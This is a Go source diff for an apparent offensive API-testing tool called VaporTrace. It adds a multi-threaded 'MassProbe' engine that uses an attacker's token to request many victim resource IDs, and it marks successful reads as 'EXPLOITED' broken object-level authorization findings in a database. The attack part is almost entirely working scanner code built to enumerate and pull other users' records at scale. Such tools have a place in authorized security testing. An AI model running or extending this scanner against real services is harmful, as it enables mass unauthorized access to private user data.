@@ -7,6 +7,7 @@ import (
 	"net/url"
 	"path"
 	"strings"
+	"sync" // PATCH: Added sync for WaitGroup
 
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
 	"github.com/pterm/pterm"
@@ -16,8 +17,45 @@ import (
 type BOLAContext struct {
 	BaseURL       string
 	VictimID      string
-	AttackerID    string // Added for Phase 9.2 Baseline
+	AttackerID    string 
 	AttackerToken string
+}
+
+// MassProbe handles high-speed concurrent BOLA scanning
+func (b *BOLAContext) MassProbe(idList []string, threads int) {
+	pterm.DefaultHeader.WithFullWidth(false).Println("BOLA Concurrency Engine [PHASE 9.3]")
+	
+	idChan := make(chan string, len(idList))
+	var wg sync.WaitGroup
+
+	// Start Progress Bar
+	pb, _ := pterm.DefaultProgressbar.WithTotal(len(idList)).WithTitle("Scanning IDs").Start()
+
+	// 1. Spawn Workers
+	for w := 1; w <= threads; w++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for id := range idChan {
+				// Create a temporary context for this specific ID
+				instance := *b
+				instance.VictimID = id
+				instance.ProbeSilent() 
+				pb.Increment()
+			}
+		}()
+	}
+
+	// 2. Feed the IDs into the channel
+	for _, id := range idList {
+		idChan <- id
+	}
+	close(idChan)
+
+	// 3. Wait for completion
+	wg.Wait()
+	pb.Stop()
+	pterm.Success.Println("Mass Scan Complete. Results persisted to database.")
 }
 
 // getResource fetches a resource and returns status and body for comparison
@@ -53,21 +91,18 @@ func (b *BOLAContext) Probe() {
 		return
 	}
 
-	// --- PHASE 9.2: BASELINE COLLECTION ---
-	// We fetch the attacker's OWN resource to see what a "Valid" response looks like.
 	var baselineBody string
 	if b.AttackerID != "" {
-		spinner, _ := pterm.DefaultSpinner.Start("Establishing Baseline (Attacker's own data)...")
+		spinner, _ := pterm.DefaultSpinner.Start("Establishing Baseline...")
 		_, body, err := b.getResource(b.AttackerID, activeToken)
 		if err == nil {
 			baselineBody = body
 			spinner.Success("Baseline established.")
 		} else {
-			spinner.Warning("Could not establish baseline. Falling back to status-only mode.")
+			spinner.Warning("Baseline failed. Status-only mode.")
 		}
 	}
 
-	// --- PHASE 9.2: THE PROBE ---
 	spinner, _ := pterm.DefaultSpinner.Start(fmt.Sprintf("Probing Victim ID: %s", b.VictimID))
 	code, probeBody, err := b.getResource(b.VictimID, activeToken)
 
@@ -76,25 +111,20 @@ func (b *BOLAContext) Probe() {
 		return
 	}
 
-	// --- PHASE 9.2: SURGICAL ANALYSIS (The Patch) ---
 	isVulnerable := false
 	analysisMsg := ""
 
 	if code == http.StatusOK {
-		// Verify if the body is just a "Not Found" or "Error" message disguised as 200 OK
 		lowerBody := strings.ToLower(probeBody)
 		isGenericError := strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") || strings.Contains(lowerBody, "denied")
 
 		if baselineBody != "" && probeBody == baselineBody {
-			// If the victim data is identical to the attacker's data, the server might be 
-			// reflecting the user's own data regardless of the ID (False Positive).
-			spinner.Warning("Potential False Positive: Server returned Attacker's own data for Victim ID.")
-			analysisMsg = "Reflected self-data (False Positive)"
+			spinner.Warning("Potential False Positive: Reflected self-data.")
+			analysisMsg = "Reflected self-data"
 		} else if isGenericError {
-			spinner.Warning("False Positive Filtered: 200 OK received but body indicates an error.")
+			spinner.Warning("False Positive Filtered: Cloaked Error.")
 			analysisMsg = "Cloaked Error Message"
 		} else {
-			// Body is 200 OK, differs from baseline, and isn't a known error string
 			isVulnerable = true
 			spinner.Success("VERIFIED BOLA VULNERABILITY")
 		}
@@ -102,25 +132,50 @@ func (b *BOLAContext) Probe() {
 
 	if isVulnerable {
 		pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
-		pterm.Warning.Println("Unauthorized data extraction confirmed via Response Diffing.")
+		pterm.Warning.Println("Unauthorized data extraction confirmed.")
 
 		pterm.DefaultTable.WithData(pterm.TableData{
 			{"METRIC", "VALUE"},
 			{"RESOURCE ID", b.VictimID},
 			{"LEAK SIZE", fmt.Sprintf("%d bytes", len(probeBody))},
-			{"DIFF STATUS", "Structural Divergence Confirmed"},
 		}).WithBoxed().Render()
 
 		db.LogQueue <- db.Finding{
 			Phase:   "PHASE 9.2: SURGICAL BOLA",
 			Target:  b.BaseURL + "/" + b.VictimID,
-			Details: fmt.Sprintf("Confirmed BOLA on %s (Diff Verified)", b.VictimID),
+			Details: fmt.Sprintf("Confirmed BOLA on %s", b.VictimID),
 			Status:  "EXPLOITED",
 		}
 	} else if code == 403 || code == 401 {
-		spinner.Success("Target Secure (403 Forbidden)")
+		spinner.Success("Target Secure (403/401)")
 	} else {
-		spinner.Stop() // 
+		spinner.Stop() 
 		pterm.Info.Printfln("Result: %s", analysisMsg)
+	}
+}
+
+// ProbeSilent - MOVED OUTSIDE Probe() to fix syntax error
+func (b *BOLAContext) ProbeSilent() {
+	activeToken := b.AttackerToken
+	if activeToken == "" { activeToken = CurrentSession.AttackerToken }
+
+	code, body, err := b.getResource(b.VictimID, activeToken)
+	if err != nil { return }
+
+	if code == 200 {
+		lowerBody := strings.ToLower(body)
+		if strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") {
+			return 
+		}
+
+		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
+		pterm.Warning.Printfln(" BOLA Confirmed: %s", b.VictimID)
+
+		db.LogQueue <- db.Finding{
+			Phase:   "PHASE 9.3: CONCURRENT BOLA",
+			Target:  b.BaseURL + "/" + b.VictimID,
+			Details: "Confirmed via Multi-threaded Worker Pool",
+			Status:  "EXPLOITED",
+		}
 	}
 }
